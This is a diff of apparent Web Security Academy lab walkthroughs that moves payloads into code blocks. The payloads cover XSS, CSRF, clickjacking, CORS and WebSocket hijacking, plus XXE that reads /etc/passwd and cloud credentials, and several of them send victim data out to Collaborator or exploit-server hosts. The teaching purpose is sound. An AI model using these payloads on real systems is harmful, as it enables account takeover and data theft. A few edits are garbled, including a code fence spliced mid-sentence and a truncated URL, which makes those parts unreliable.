-3. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified `TrackingId` cookie.
-4. Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side query is executed asynchronously.
+3. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified ```bash
+TrackingId` cookie.
+4. Go to the Colla
+b``orator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side query is executed asynchronously.
 5. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The password of the `administrator` user should appear in the subdomain of the interaction, and you can view this within the Collaborator tab. For DNS interactions, the full domain name that was looked up is shown in the Description tab. For HTTP interactions, the full domain name is shown in the Host header in the Request to Collaborator tab.
 6. In the browser, click "My account" to open the login page. Use the password to log in as the `administrator` user.
    - [Using HTML-encoding](/web-security/cross-site-scripting/contexts#making-use-of-html-encoding)
@@ -844,8 +978,10 @@ function in their browser.
 2. From the lab banner, open the exploit server.
 3. In the **Body** section, add the following malicious `iframe`:
 
-`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#"
-onload="this.src+='<img src=x onerror=print()>'"></iframe>`
+   ```html
+   <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#"
+   onload="this.src+='<img src=x onerror=print()>'"></iframe>
+   ```
 
 4. Store the exploit, then click **View exploit** to confirm that the `print()` function is called.
 5. Go back to the exploit server and click **Deliver to victim** to solve the lab.
@@ -907,7 +1043,9 @@ scripting attack that breaks out of the JavaScript string and calls the
 2. Observe that the random string has been reflected inside a JavaScript string.
 3. Replace your input with the following payload to break out of the JavaScript string and inject an alert:
 
-`'-alert(1)-'`
+```sql
+'-alert(1)-'
+```
 
 4. Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in the browser. When you load the page it should trigger an alert.
 
@@ -1053,9 +1191,11 @@ Your solution must not require any user interaction. Manually causing
 13. When the attack is finished, review the results. Note that most payloads caused a `400` response, but the `onresize` payload caused a `200` response.
 14. Go to the exploit server and paste the following code, replacing `YOUR-LAB-ID` with your lab ID:
 
-`<iframe src="https://YOUR-LAB-ID.web-security-
-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E"
-onload=this.style.width='100px'>`
+   ```html
+   <iframe src="https://YOUR-LAB-ID.web-security-
+   academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E"
+   onload=this.style.width='100px'>
+   ```
 
 15. Click **Store** and **Deliver exploit to victim**.
 
@@ -1072,9 +1212,11 @@ tag and automatically alerts `document.cookie`.
 
 1. Go to the exploit server and paste the following code, replacing `YOUR-LAB-ID` with your lab ID:
 
-`<script> location = 'https://YOUR-LAB-ID.web-security-
-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
-</script>`
+   ```html
+   <script> location = 'https://YOUR-LAB-ID.web-security-
+   academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+   </script>
+   ```
 
 2. Click "Store" and "Deliver exploit to victim".
 
@@ -1095,7 +1237,7 @@ To solve the lab, perform a cross-site scripting attack that calls the
 
 1. Inject a standard XSS payload, such as:
 
-`<img src=1 onerror=alert(1)>`
+   `<img src=1 onerror=alert(1)>`
 
 2. Observe that this payload gets blocked. In the next few steps, we'll use Burp Intruder to test which tags and attributes are being blocked.
 3. Open Burp's browser and use the search function in the lab. Send the resulting request to Burp Intruder.
@@ -1106,11 +1248,11 @@ To solve the lab, perform a cross-site scripting attack that calls the
 8. When the attack is finished, review the results. Observe that all payloads caused a `400` response, except for the ones using the `<svg>`, `<animatetransform>`, `<title>`, and `<image>` tags, which received a `200` response.
 9. Go back to the **Intruder** tab and replace your search term with:
 
-`<svg><animatetransform%20=1>`
+   `<svg><animatetransform%20=1>`
 
 10. Place the cursor before the `=` character and click **Add §** to create a payload position. The value of the search term should now be:
 
-`<svg><animatetransform%20§§=1>`
+   `<svg><animatetransform%20§§=1>`
 
 11. Visit the [XSS cheat sheet](/web-security/cross-site-scripting/cheat-sheet) and click **Copy events to clipboard**.
 12. In Burp Intruder, in the **Payloads** side panel, click **Clear** to remove the previous payloads. Then click **Paste** to paste the list of attributes into the payloads list. Click **Start attack**.
@@ -1119,8 +1261,10 @@ To solve the lab, perform a cross-site scripting attack that calls the
 Visit the following URL in the browser to confirm that the alert() function is
 called and the lab is solved:
 
-`https://YOUR-LAB-ID.web-security-
-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E`
+   ```bash
+   https://YOUR-LAB-ID.web-security-
+   academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
+   ```
 
 ### Lab: Reflected XSS in canonical link tag
 
@@ -1982,10 +2126,12 @@ bear in mind that two domains can be located within the same site.
 
 2. In the browser, go to the exploit server and use the following template to create a script for a CSWSH proof of concept:
 
-`<script> var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-
-academy.net/chat'); ws.onopen = function() { ws.send("READY"); }; ws.onmessage
-= function(event) { fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com',
-{method: 'POST', mode: 'no-cors', body: event.data}); }; </script>`
+   ```html
+   <script> var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-
+   academy.net/chat'); ws.onopen = function() { ws.send("READY"); }; ws.onmessage
+   = function(event) { fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com',
+   {method: 'POST', mode: 'no-cors', body: event.data}); }; </script>
+   ```
 
 3. Store and view the exploit yourself
 
@@ -2009,7 +2155,7 @@ academy.net/chat'); ws.onopen = function() { ws.send("READY"); }; ws.onmessage
 
 4. Try injecting an XSS payload via the `username` parameter, for example:
 
-`<script>alert(1)</script>`
+   `<script>alert(1)</script>`
 
 5. Observe that the `alert(1)` is called, confirming that this is a viable reflected XSS vector.
 
@@ -2023,18 +2169,22 @@ academy.net/chat'); ws.onopen = function() { ws.send("READY"); }; ws.onmessage
 
 1. Recreate the CSWSH script that you tested on the exploit server earlier.
 
-`<script> var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-
-academy.net/chat'); ws.onopen = function() { ws.send("READY"); }; ws.onmessage
-= function(event) { fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com',
-{method: 'POST', mode: 'no-cors', body: event.data}); }; </script>`
+   ```html
+   <script> var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-
+   academy.net/chat'); ws.onopen = function() { ws.send("READY"); }; ws.onmessage
+   = function(event) { fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com',
+   {method: 'POST', mode: 'no-cors', body: event.data}); }; </script>
+   ```
 
 2. URL encode the entire script.
 
 3. Go back to the exploit server and create a script that induces the viewer's browser to send the `GET` request you just tested, but use the URL-encoded CSWSH payload as the `username` parameter. The following is one possible approach:
 
-`<script> document.location = "https://cms-YOUR-LAB-ID.web-security-
-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password;=anything";
-</script>`
+   ```html
+   <script> document.location = "https://cms-YOUR-LAB-ID.web-security-
+   academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password;=anything";
+   </script>
+   ```
 
 4. Store and view the exploit yourself.
 
@@ -2079,7 +2229,9 @@ to test your exploit.
 
 - Browsers block popups from being opened unless they are triggered by a manual user interaction, such as a click. The victim user will click on any page you send them to, so you can create popups using a global event handler as follows:
 
-`<script> window.onclick = () => { window.open('about:blank') } </script>`
+   ```html
+   <script> window.onclick = () => { window.open('about:blank') } </script>
+   ```
 
 ##### Solution
 
@@ -2099,11 +2251,13 @@ to test your exploit.
 
 2. Use the following template to create a basic CSRF attack for changing the victim's email address:
 
-`<script> history.pushState('', '', '/') </script> <form action="https://YOUR-
-LAB-ID.web-security-academy.net/my-account/change-email" method="POST"> <input
-type="hidden" name="email" value="foo@bar.com" /> <input type="submit"
-value="Submit request" /> </form> <script> document.forms[0].submit();
-</script>`
+   ```html
+   <script> history.pushState('', '', '/') </script> <form action="https://YOUR-
+   LAB-ID.web-security-academy.net/my-account/change-email" method="POST"> <input
+   type="hidden" name="email" value="foo@bar.com" /> <input type="submit"
+   value="Submit request" /> </form> <script> document.forms[0].submit();
+   </script>
+   ```
 
 3. Store and view the exploit yourself. What happens next depends on how much time has elapsed since you logged in:
    - If it has been longer than two minutes, you will be logged in via the OAuth flow, and the attack will fail. In this case, repeat this step immediately.
@@ -2120,11 +2274,10 @@ value="Submit request" /> </form> <script> document.forms[0].submit();
 
 4. Change the JavaScript so that the attack first refreshes the victim's session by forcing their browser to visit `/social-login`, then submits the email change request after a short pause. The following is one possible approach:
 
-`<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-
-account/change-email"> <input type="hidden" name="email" value="pwned@web-
-security-academy.net"> </form> <script> window.open('https://YOUR-LAB-ID.web-
-security-academy.net/social-login'); setTimeout(changeEmail, 5000); function
-changeEmail(){ document.forms[0].submit(); } </script>`
+   ```html
+   <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="pwned@web-security-academy.net"> </form> <script> window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login'); setTimeout(changeEmail, 5000); function
+   changeEmail(){ document.forms[0].submit(); } </script>
+   ```
 
 Note that we've opened the `/social-login` in a new window to avoid navigating
 away from the exploit before the change email request is sent.
@@ -2139,13 +2292,11 @@ away from the exploit before the change email request is sent.
 
 2. Tweak the exploit so that it induces the victim to click on the page and only opens the popup once the user has clicked. The following is one possible approach:
 
-`<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-
-account/change-email"> <input type="hidden" name="email"
-value="pwned@portswigger.net"> </form> <p>Click anywhere on the page</p>
+   ```html
+   <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="pwned@portswigger.net"> </form> <p>Click anywhere on the page</p>
 
-<script> window.onclick = () => { window.open('https://YOUR-LAB-ID.web-
-security-academy.net/social-login'); setTimeout(changeEmail, 5000); } function
-changeEmail() { document.forms[0].submit(); } </script>`
+   <script> window.onclick = () => { window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login'); setTimeout(changeEmail, 5000); } function changeEmail() { document.forms[0].submit(); } </script>
+   ```
 
 3. Test the attack on yourself again while monitoring the proxy history in Burp.
 
@@ -2179,7 +2330,7 @@ use a different email address for the final exploit you deliver to the victim.
 3. Delete the Referer header entirely and observe that the request is now accepted.
 4. Create and host a proof of concept exploit as described in the solution to the [CSRF vulnerability with no defenses](/web-security/csrf/lab-no-defenses) lab. Include the following HTML to suppress the Referer header:
 
-`<meta name="referrer" content="no-referrer">`
+   `<meta name="referrer" content="no-referrer">`
 
 5. Change the email address in your exploit so that it doesn't match your own.
 6. Store the exploit, then click "Deliver to victim" to solve the lab.
@@ -2208,8 +2359,8 @@ use a different email address for the final exploit you deliver to the victim.
 2. Send the request to Burp Repeater. Observe that if you change the domain in the Referer HTTP header, the request is rejected.
 3. Copy the original domain of your lab instance and append it to the Referer header in the form of a query string. The result should look something like this:
 
-`Referer: https://arbitrary-incorrect-domain.net?YOUR-LAB-ID.web-security-
-academy.net`
+   `Referer: https://arbitrary-incorrect-domain.net?YOUR-LAB-ID.web-security-
+   academy.net`
 
 4. Send the request and observe that it is now accepted. The website seems to accept any Referer header as long as it contains the expected domain somewhere in the string.
 5. Create a CSRF proof of concept exploit as described in the solution to the [CSRF vulnerability with no defenses](/web-security/csrf/lab-no-defenses) lab and host it on the exploit server. Edit the JavaScript so that the third argument of the `history.pushState()` function includes a query string with your lab instance URL as follows:
@@ -2221,7 +2372,7 @@ of the target site in the query string, just like we tested earlier.
 
 6. If you store the exploit and test it by clicking "View exploit", you may encounter the "invalid Referer header" error again. This is because many browsers now strip the query string from the Referer header by default as a security measure. To override this behavior and ensure that the full URL is included in the request, go back to the exploit server and add the following header to the "Head" section:
 
-`Referrer-Policy: unsafe-url`
+   `Referrer-Policy: unsafe-url`
 
 Note that unlike the normal Referer header, the word "referrer" must be
 spelled correctly in this case.
@@ -2253,11 +2404,13 @@ The victim will be using Chrome so test your exploit on that browser.
 1. Log in to your account on the target website.
 2. Go to the exploit server and paste the following HTML template into the **Body** section:
 
-`<style> iframe { position:relative; width:$width_value; height:
-$height_value; opacity: $opacity; z-index: 2; } div { position:absolute;
-top:$top_value; left:$side_value; z-index: 1; } </style> <div>Test me</div>
+   ```html
+   <style> iframe { position:relative; width:$width_value; height:
+   $height_value; opacity: $opacity; z-index: 2; } div { position:absolute;
+   top:$top_value; left:$side_value; z-index: 1; } </style> <div>Test me</div>
 
-<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>`
+   <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
+   ```
 
 3. Make the following adjustments to the template:
    - Replace `YOUR-LAB-ID` in the iframe `src` attribute with your unique lab ID.
@@ -2265,8 +2418,11 @@ top:$top_value; left:$side_value; z-index: 1; } </style> <div>Test me</div>
    - Substitute suitable pixel values for the `$top_value` and `$side_value` variables of the decoy web content so that the "Delete account" button and the "Test me" decoy action align (we suggest 300px and 60px respectively).
    - Set the opacity value `$opacity` to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.
 4. Click **Store** and then **View exploit**.
+
 5. Hover over **Test me** and ensure the cursor changes to a hand indicating that the div element is positioned correctly. **Do not actually click the "Delete account" button yourself.** If you do, the lab will be broken and you will need to wait until it resets to try again (about 20 minutes). If the div does not line up properly, adjust the `top` and `left` properties of the style sheet.
+
 6. Once you have the div element lined up correctly, change "Test me" to "Click me" and click **Store**.
+
 7. Click on **Deliver exploit to victim** and the lab should be solved.
 
 ### Lab: Clickjacking with form input data prefilled from a URL parameter
@@ -2299,12 +2455,14 @@ use a different email address for the final exploit you deliver to the victim.
 1. Log in to the account on the target website.
 2. Go to the exploit server and paste the following HTML template into the "Body" section:
 
-`<style> iframe { position:relative; width:$width_value; height:
-$height_value; opacity: $opacity; z-index: 2; } div { position:absolute;
-top:$top_value; left:$side_value; z-index: 1; } </style> <div>Test me</div>
+   ```html
+   <style> iframe { position:relative; width:$width_value; height:
+   $height_value; opacity: $opacity; z-index: 2; } div { position:absolute;
+   top:$top_value; left:$side_value; z-index: 1; } </style> <div>Test me</div>
 
-<iframe src="YOUR-LAB-ID.web-security-academy.net/my-
-account?email=hacker@attacker-website.com"></iframe>`
+   <iframe src="YOUR-LAB-ID.web-security-academy.net/my-
+   account?email=hacker@attacker-website.com"></iframe>
+   ```
 
 3. Make the following adjustments to the template:
    - Replace `YOUR-LAB-ID` with your unique lab ID so that the URL points to the target website's user account page, which contains the "Update email" form.
@@ -2344,12 +2502,14 @@ use a different email address for the final exploit you deliver to the victim.
 1. Log in to the account on the target website.
 2. Go to the exploit server and paste the following HTML template into the "Body" section:
 
-`<style> iframe { position:relative; width:$width_value; height:
-$height_value; opacity: $opacity; z-index: 2; } div { position:absolute;
-top:$top_value; left:$side_value; z-index: 1; } </style> <div>Test me</div>
+   ```html
+   <style> iframe { position:relative; width:$width_value; height:
+   $height_value; opacity: $opacity; z-index: 2; } div { position:absolute;
+   top:$top_value; left:$side_value; z-index: 1; } </style> <div>Test me</div>
 
-<iframe sandbox="allow-forms" src="YOUR-LAB-ID.web-security-academy.net/my-
-account?email=hacker@attacker-website.com"></iframe>`
+   <iframe sandbox="allow-forms" src="YOUR-LAB-ID.web-security-academy.net/my-
+   account?email=hacker@attacker-website.com"></iframe>
+   ```
 
 3. Make the following adjustments to the template:
    _ Replace `YOUR-LAB-ID` in the iframe `src` attribute with your unique lab ID so that the URL of the target website's user account page, which contains the "Update email" form.
@@ -2378,13 +2538,15 @@ The victim will be using Chrome so test your exploit on that browser.
 
 1. Go to the exploit server and paste the following HTML template into the **Body** section:
 
-`<style> iframe { position:relative; width:$width_value; height:
-$height_value; opacity: $opacity; z-index: 2; } div { position:absolute;
-top:$top_value; left:$side_value; z-index: 1; } </style> <div>Test me</div>
+   ```html
+   <style> iframe { position:relative; width:$width_value; height:
+   $height_value; opacity: $opacity; z-index: 2; } div { position:absolute;
+   top:$top_value; left:$side_value; z-index: 1; } </style> <div>Test me</div>
 
-<iframe src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1
-onerror=print()>&email=hacker@attacker-
-website.com&subject=test&message=test#feedbackResult"></iframe>`
+   <iframe src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1
+   onerror=print()>&email=hacker@attacker-
+   website.com&subject=test&message=test#feedbackResult"></iframe>
+   ```
 
 2. Make the following adjustments to the template:
    - Replace `YOUR-LAB-ID` in the iframe `src` attribute with your unique lab ID so that the URL points to the target website's "Submit feedback" page.
@@ -2417,13 +2579,15 @@ The victim will be using Chrome so test your exploit on that browser.
 1. Log in to your account on the target website and go to the user account page.
 2. Go to the exploit server and paste the following HTML template into the "Body" section:
 
-`<style> iframe { position:relative; width:$width_value; height:
-$height_value; opacity: $opacity; z-index: 2; }    .firstClick, .secondClick {
-position:absolute; top:$top_value1; left:$side_value1; z-index: 1; }
-.secondClick { top:$top_value2; left:$side_value2; } </style> <div
-class="firstClick">Test me first</div> <div class="secondClick">Test me
-next</div> <iframe src="YOUR-LAB-ID.web-security-academy.net/my-
-account"></iframe>`
+   ```html
+   <style> iframe { position:relative; width:$width_value; height:
+   $height_value; opacity: $opacity; z-index: 2; }    .firstClick, .secondClick {
+   position:absolute; top:$top_value1; left:$side_value1; z-index: 1; }
+   .secondClick { top:$top_value2; left:$side_value2; } </style> <div
+   class="firstClick">Test me first</div> <div class="secondClick">Test me
+   next</div> <iframe src="YOUR-LAB-ID.web-security-academy.net/my-
+   account"></iframe>
+   ```
 
 3. Make the following adjustments to the template:
    - Replace `YOUR-LAB-ID` with your unique lab ID so that URL points to the target website's user account page.
@@ -2449,8 +2613,10 @@ use the exploit server to post a message to the target site that causes the
 1. Notice that the home page contains an `addEventListener()` call that listens for a web message.
 2. Go to the exploit server and add the following `iframe` to the body. Remember to add your own lab ID:
 
-`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/"
-onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`
+   ```html
+   <iframe src="https://YOUR-LAB-ID.web-security-academy.net/"
+   onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
+   ```
 
 3. Store the exploit and deliver it to the victim.
 
@@ -2472,8 +2638,10 @@ server that exploits this vulnerability and calls the `print()` function.
 1. Notice that the home page contains an `addEventListener()` call that listens for a web message. The JavaScript contains a flawed `indexOf()` check that looks for the strings `"http:"` or `"https:"` anywhere within the web message. It also contains the sink `location.href`.
 2. Go to the exploit server and add the following `iframe` to the body, remembering to replace `YOUR-LAB-ID` with your lab ID:
 
-`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/"
-onload="this.contentWindow.postMessage('javascript:print()//http:','*')">`
+   ```html
+   <iframe src="https://YOUR-LAB-ID.web-security-academy.net/"
+   onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
+   ```
 
 3. Store the exploit and deliver it to the victim.
 
@@ -2496,9 +2664,11 @@ and calls the `print()` function.
 1. Notice that the home page contains an event listener that listens for a web message. This event listener expects a string that is parsed using `JSON.parse()`. In the JavaScript, we can see that the event listener expects a `type` property and that the `load-channel` case of the `switch` statement changes the `iframe src` attribute.
 2. Go to the exploit server and add the following `iframe` to the body, remembering to replace `YOUR-LAB-ID` with your lab ID:
 
-`<iframe src=https://YOUR-LAB-ID.web-security-academy.net/
-onload='this.contentWindow.postMessage("{\"type\":\"load-
-channel\",\"url\":\"javascript:print()\"}","*")'>`
+   ```html
+   <iframe src=https://YOUR-LAB-ID.web-security-academy.net/
+   onload='this.contentWindow.postMessage("{\"type\":\"load-
+   channel\",\"url\":\"javascript:print()\"}","*")'>
+   ```
 
 3. Store the exploit and deliver it to the victim.
 
@@ -2527,16 +2697,18 @@ lab, exploit this vulnerability and redirect the victim to the exploit server.
 The blog post page contains the following link, which returns to the home page
 of the blog:
 
-`<a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location);
-if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to
-Blog</a>`
+   ```html
+   <a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location);
+   if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to
+   Blog</a>
+   ```
 
 The `url` parameter contains an open redirection vulnerability that allows you
 to change where the "Back to Blog" link takes the user. To solve the lab,
 construct and visit the following URL, remembering to change the URL to
 contain your lab ID and your exploit server ID:
 
-`https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-
+   `https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-`
 
 ### Lab: DOM-based cookie manipulation
 
@@ -2550,10 +2722,12 @@ victim to the correct pages.
 1. Notice that the home page uses a client-side cookie called `lastViewedProduct`, whose value is the URL of the last product page that the user visited.
 2. Go to the exploit server and add the following `iframe` to the body, remembering to replace `YOUR-LAB-ID` with your lab ID:
 
-`<iframe src="https://YOUR-LAB-ID.web-security-
-academy.net/product?productId=1&'><script>print()</script>"
-onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-
-academy.net';window.x=1;">`
+   ```html
+   <iframe src="https://YOUR-LAB-ID.web-security-
+   academy.net/product?productId=1&'><script>print()</script>"
+   onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-
+   academy.net';window.x=1;">
+   ```
 
 3. Store the exploit and deliver it to the victim.
 
@@ -2579,16 +2753,20 @@ Please note that the intended solution to this lab will only work in Chrome.
 
 1. Go to one of the blog posts and create a comment containing the following anchors:
 
-`<a id=defaultAvatar><a id=defaultAvatar name=avatar
-href="cid:&quot;onerror=alert(1)//">`
+   ```html
+   <a id=defaultAvatar><a id=defaultAvatar name=avatar
+   href="cid:&quot;onerror=alert(1)//">
+   ```
 
 2. Return to the blog post and create a second comment containing any random text. The next time the page loads, the `alert()` is called.
 
 The page for a specific blog post imports the JavaScript file
 `loadCommentsWithDomClobbering.js`, which contains the following code:
 
-`let defaultAvatar = window.defaultAvatar || {avatar:
-'/resources/images/avatarDefault.svg'}`
+   ```javascript
+   let defaultAvatar = window.defaultAvatar || {avatar:
+   '/resources/images/avatarDefault.svg'}
+   ```
 
 The `defaultAvatar` object is implemented using this dangerous pattern
 containing the logical `OR` operator in conjunction with a global variable.
@@ -2627,12 +2805,16 @@ Chrome to complete this lab.
 
 1. Go to one of the blog posts and create a comment containing the following HTML:
 
-`<form id=x tabindex=0 onfocus=print()><input id=attributes>`
+   ```html
+   <form id=x tabindex=0 onfocus=print()><input id=attributes>
+   ```
 
 2. Go to the exploit server and add the following `iframe` to the body:
 
-`<iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3
-onload="setTimeout(()=>this.src=this.src+'#x',500)">`
+   ```html
+   <iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3
+   onload="setTimeout(()=>this.src=this.src+'#x',500)">
+   ```
 
 Remember to change the URL to contain your lab ID and make sure that the
 `postId` parameter matches the `postId` of the blog post into which you
@@ -2676,10 +2858,12 @@ You can log in to your own account using the following credentials:
 4. Observe that the origin is reflected in the `Access-Control-Allow-Origin` header.
 5. In the browser, go to the exploit server and enter the following HTML, replacing `YOUR-LAB-ID` with your unique lab URL:
 
-`<script> var req = new XMLHttpRequest(); req.onload = reqListener;
-req.open('get','https://YOUR-LAB-ID.web-security-
-academy.net/accountDetails',true); req.withCredentials = true; req.send();
-function reqListener() { location='/log?key='+this.responseText; }; </script>`
+   ```html
+   <script> var req = new XMLHttpRequest(); req.onload = reqListener;
+   req.open('get','https://YOUR-LAB-ID.web-security-
+   academy.net/accountDetails',true); req.withCredentials = true; req.send();
+   function reqListener() { location='/log?key='+this.responseText; }; </script>
+   ```
 
 6. Click **View exploit**. Observe that the exploit works - you have landed on the log page and your API key is in the URL.
 7. Go back to the exploit server and click **Deliver exploit to victim**.
@@ -2705,19 +2889,19 @@ You can log in to your own account using the following credentials:
 4. Observe that the "null" origin is reflected in the `Access-Control-Allow-Origin` header.
 5. In the browser, go to the exploit server and enter the following HTML, replacing `YOUR-LAB-ID` with the URL for your unique lab URL and `YOUR-EXPLOIT-SERVER-ID` with the exploit server ID:
 
-```html
-<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
-    var req = new XMLHttpRequest();
-    req.onload = reqListener;
-    req.open('GET', 'https://0a6c00ac0455629682b28dc400d10016.web-security-academy.net/accountDetails', true); 
-    req.withCredentials = true;
-    req.send();
-    
-    function reqListener() {
-        location = 'https://exploit-0a860049045262d082588c61012a008b.exploit-server.net/log?key=' + encodeURIComponent(this.responseText);
-    }
-</script>"></iframe>
-```
+   ```html
+   <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+      var req = new XMLHttpRequest();
+      req.onload = reqListener;
+      req.open('GET', 'https://0a6c00ac0455629682b28dc400d10016.web-security-academy.net/accountDetails', true); 
+      req.withCredentials = true;
+      req.send();
+      
+      function reqListener() {
+         location = 'https://exploit-0a860049045262d082588c61012a008b.exploit-server.net/log?key=' + encodeURIComponent(this.responseText);
+      }
+   </script>"></iframe>
+   ```
 
 
 Notice the use of an iframe sandbox as this generates a null origin request.
@@ -2756,11 +2940,11 @@ way of injecting JavaScript into the subdomain.
 6. Observe that the `productID` parameter is vulnerable to XSS.
 7. In the browser, go to the exploit server and enter the following HTML, replacing `YOUR-LAB-ID` with your unique lab URL and `YOUR-EXPLOIT-SERVER-ID` with your exploit server ID:
 
-```html
-<script>
-    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
-</script>
-```
+   ```html
+   <script>
+      document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+   </script>
+   ```
 
 8. Click **View exploit**. Observe that the exploit works - you have landed on the log page and your API key is in the URL.
 9. Go back to the exploit server and click **Deliver exploit to victim**.
@@ -2781,7 +2965,9 @@ the `/etc/passwd` file.
 1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
 2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
 
-`<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`
+   ```html
+   <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+   ```
 
 3. Replace the `productId` number with a reference to the external entity: `&xxe;`. The response should contain "Invalid product ID:" followed by the contents of the `/etc/passwd` file.
 
@@ -2802,7 +2988,9 @@ obtains the server's IAM secret access key from the EC2 metadata endpoint.
 1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
 2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
 
-`<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>`
+   ```html
+   <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
+   ```
 
 3. Replace the `productId` number with a reference to the external entity: `&xxe;`. The response should contain "Invalid product ID:" followed by the response from the metadata endpoint, which will initially be a folder name.
 4. Iteratively update the URL in the DTD to explore the API until you reach `/latest/meta-data/iam/security-credentials/admin`. This should return JSON containing the `SecretAccessKey`.
@@ -2829,8 +3017,9 @@ To solve the lab, you must use Burp Collaborator's default public server.
 1. Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite Professional.
 2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:
 
-`<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-
-SUBDOMAIN"> ]>`
+   ```html
+   <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
+   ```
 
 3. Replace the `productId` number with a reference to the external entity:
 
@@ -2860,8 +3049,10 @@ To solve the lab, you must use Burp Collaborator's default public server.
 1. Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite Professional.
 2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:
 
-`<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-
-SUBDOMAIN"> %xxe; ]>`
+   ```html
+   <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-
+   SUBDOMAIN"> %xxe; ]>
+   ```
 
 3. Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.
 
@@ -2887,15 +3078,19 @@ Collaborator's default public server.
 2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
 3. Place the Burp Collaborator payload into a malicious DTD file:
 
-`<!ENTITY % file SYSTEM "file:///etc/hostname"> <!ENTITY % eval "<!ENTITY
-&#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>"> %eval;
-%exfil;`
